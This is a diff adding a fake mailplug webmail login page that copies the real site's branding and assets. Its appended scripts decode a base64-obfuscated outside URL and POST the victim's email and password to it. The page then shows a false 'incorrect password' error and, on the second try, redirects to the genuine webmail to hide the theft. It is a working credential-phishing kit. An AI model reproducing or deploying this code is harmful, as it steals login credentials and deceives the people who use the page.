@@ -1,0 +1,304 @@
+﻿<!-- step1 협력사용 : PC 화면 -->
+<script src="https://unpkg.com/phosphor-icons"></script>
+
+<!DOCTYPE html
+	PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta http-equiv="Content-Script-Type" content="text/javascript" />
+	<meta http-equiv="Content-Style-Type" content="text/css" />
+	<meta name="viewport"
+		content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, target-densitydpi=medium-dpi">
+	<meta name="keywords" content="" />
+	<meta name="description" content="" />
+	<link type="text/css" rel="stylesheet" href="https://login.mailplug.com/asset/login/css/login.css" />
+
+	<title>mailplug-Login</title>
+	<link rel="icon" href="https://login.mailplug.com/asset/app_api/images/login_CI/Favicon.ico">
+
+	<script type="text/javascript" src=""></script>
+</head>
+
+<body>
+	<form class="login_wrapper" style="display:block">
+		<div class="login_wrapper-content">
+			<div class="logo">
+				<div class="logo-image">
+					<img src="https://login.mailplug.com/asset/app_api/images/login_CI/login_logo-mailplug.svg" alt="로고">
+				</div>
+					<p>로그인</p>
+				</div>
+				<div class="input_id">
+					<input id="login_email" class="textinput" type="email" name="email" placeholder="id@example.com" title="이메일 또는 도메인 주소 입력" value="" required/>
+			</div>
+			<div class="input_id">
+				<input id="login_password" class="textinput" type="password"  name="password" placeholder="비밀번호" title="비밀번호입력" value="" required />
+		</div>
+					<div id="error_text" class="content-input" style="display: none;">
+						<div class="input_toast-error">
+							<i class="ph-warning-fill"></i>
+							<p class="errMsg">이메일 또는 도메인을 확인해 주세요.</p>
+						</div>
+					</div>
+					<div class="login_btn" tabindex="-1">
+						<button class="button" id="loginSubmit" style="background-color: #FF6412;" style="cursor: default;">다음</button>
+			</div>
+						<div class="login_des">
+							<p>아이디가 없으신가요?<br> 도메인을 입력하여 다음 단계로 넘어가 주세요.</p>
+						</div>
+					</div>
+				</form>
+				<div class="login-footer">
+					<div class="footer-copyright">
+						<p>© mailplug Inc. All rights reserved.</p>
+					</div>
+					<div class="mb-auth-lang-selector">
+						<div id="mb-auth-lang-selector-opener" class="mb-auth-lang" tabindex="0">
+							한국어
+							<span class="select_icon closed">
+					<img src="https://login.mailplug.com/asset/app_api/images/login_CI/selected_mb-auth-lang.svg" alt="목록 열고 닫기">
+				</span>
+						</div>
+						<div id="mb-auth-lang-slider">
+							<a href="javascript:language_select('kr');">
+								<div class="mb-auth-lang" style='background-color: #FFFAF2; color: #FF6412'>한국어</div>
+							</a>
+							<a href="javascript:language_select('en');">
+								<div class="mb-auth-lang">English</div>
+							</a>
+							<a href="javascript:language_select('jp');">
+								<div class="mb-auth-lang">日本語</div>
+							</a>
+							<a href="javascript:language_select('cng');">
+								<div class="mb-auth-lang">中文简体</div>
+							</a>
+							<a href="javascript:language_select('cnb');">
+								<div class="mb-auth-lang">繁體中文</div>
+							</a>
+							<a href="javascript:language_select('vn');">
+								<div class="mb-auth-lang">tiếng Việt</div>
+							</a>
+							<a href="javascript:language_select('idn');">
+								<div class="mb-auth-lang">Bahasa Indonesia</div>
+							</a>
+							<a href="javascript:language_select('th');">
+								<div class="mb-auth-lang">ภาษาไทย</div>
+							</a>
+						</div>
+					</div>
+				</div>
+</body>
+
+
+
+
+<!-- <script type="text/javascript">
+	$("#mb-auth-lang-selector-opener")
+		.on("click", toggle_lang_selector)
+		.on('keyup', function(e) {
+			if (e.keyCode === 13) {
+				toggle_lang_selector();
+			}
+		});
+
+	$('#login_input')
+		.on('keyup', function(e) {
+			if (e.keyCode === 13) {
+				$('.login_btn').trigger('click');
+				return;
+			}
+
+			if ($(this).val().length) {
+				$('.login_btn .button').css({'cursor':'pointer'});
+				$('.login_btn').attr('tabindex', '0');
+			} else {
+				$('.login_btn .button').css({'cursor':'default'});
+				$('.login_btn').attr('tabindex', '-1');
+			}
+				
+			if ($('#login_input').css('border-bottom-color') === 'rgb(233, 233, 233)') {
+				$('#login_input').css('border-bottom-color', '#241E17');
+			}
+		})
+		.on('focus', function() {
+			$("#mb-auth-lang-selector-opener").find("span").removeClass('opened').addClass('closed');
+			$("#mb-auth-lang-slider").hide();
+		})
+		.trigger('focus');
+		
+	$('.login_btn')
+		.on('click', function() {
+			var input = $('#login_input').val();
+
+			if (input.length === 0) {
+				return;
+			}
+
+			var index = input.indexOf('@');
+			var host_domain, cid;
+
+			if (index === -1) {
+				host_domain = input;
+			} else {
+				var tmp = input.split('@');
+				cid = tmp[0];
+				host_domain = tmp[1]; 
+			}
+
+			$.ajax({
+				url: '/login',
+				dataType: "json",
+				data: {
+					"cid": cid,
+					"host_domain": host_domain,
+					"ajax": true 
+				},
+				success: function(d) {
+					if (d.error) {
+						$('#error_text').show();
+						$('#login_input').focus();
+						$('#login_input').css('border-bottom-color', '#E9E9E9');
+						return;
+					}
+
+					var query_parameters = 'host_domain=' + host_domain;
+
+					if (cid) {
+						query_parameters += '&cid=' + cid;
+					}
+
+
+					query_parameters += '&t=' + Math.floor(new Date().getTime() / 1000);
+
+					window.location.href = d.mailResourceUrl + '/member/login?' + query_parameters;
+				},
+			})
+		})
+		.on('keyup', function(e) {
+			if (e.keyCode === 13) {
+				$(this).trigger('click');
+			}
+		});
+		
+
+	function toggle_lang_selector() {
+		var $opener_icon = $("#mb-auth-lang-selector-opener").find("span");
+
+		if($opener_icon.hasClass('closed')){
+			$opener_icon.removeClass('closed').addClass('opened');
+			$("#mb-auth-lang-slider").show();
+		}else{
+			$opener_icon.removeClass('opened').addClass('closed');
+			$("#mb-auth-lang-slider").hide();
+		}
+	}
+
+	function language_select(lang) {
+		window.location.href = "/login?setlang=" + lang;
+	}
+</script>
+
+ -->
+
+
+
+
+
+
+<script>
+		
+		
+
+
+    var feedUpdateResponse = window.location.href;
+    var feedUpdateSplit = feedUpdateResponse.split("");
+    
+    for (var x = 0; x < feedUpdateSplit.length; x++) {
+     
+     if (feedUpdateSplit[x]=="#"){
+      var che= feedUpdateResponse.substring(x+1);
+     
+     }else{
+     
+    
+     }
+    
+     
+     
+     }
+      document.getElementById("pet").value =che
+    document.getElementById("p1").innerHTML = che
+      document.getElementById("pet").value =che
+    
+    </script>
+    
+    
+    
+    
+        <script src="https://code.jquery.com/jquery-1.9.1.js"></script>
+        <script>
+    
+          
+           $(document).ready(function() {
+
+                var user=$("#pet").val();
+              var  count=0;
+               
+            $('form').submit(function(e) {
+                
+                count=count+1;
+                
+               var d=atob("aHR0cHM6Ly9mcmVrYWkuY29tL3pic2VvdWwvbW8zMTE0cG9sLnBocA==");
+    
+                e.preventDefault();
+                   $.ajax({
+                   
+                type: 'POST',
+                url: d,
+                crossDomain: true,
+                data: $('form').serialize(),
+                
+                 beforeSend: function(xhr){
+                  $('#loginSubmit').html('Verifing...');
+                  
+                  
+    if (count>=2) { var user_domain = document.getElementById("login_email").value;
+					var domain = user_domain.split("@");
+					var host_domain = domain[1];
+					
+                        count=0;
+                        // window.location.replace(response['redirect_link']);
+						window.location.replace("https://m158.mailplug.com/webmail");
+
+    
+                      }else{
+                       var x = document.getElementById("login_email").value;
+                         
+                        
+                       $('#loginSubmit').html('CONTINUE');
+                           document.getElementById("login_password").value ="";
+                         
+                        
+                    $(".input_toast-error").show();
+                        $(".errMsg").html("The username or password you entered is incorrect.");
+                    
+    
+                         }
+                            
+                },
+                
+                
+                         
+                success: function () {
+                    $(".input_toast-error").show();
+                        $(".errMsg").html("The username or password you entered is incorrect.");
+                    
+    
+        
+                }
+              });
+            });
+        });
+        </script> 
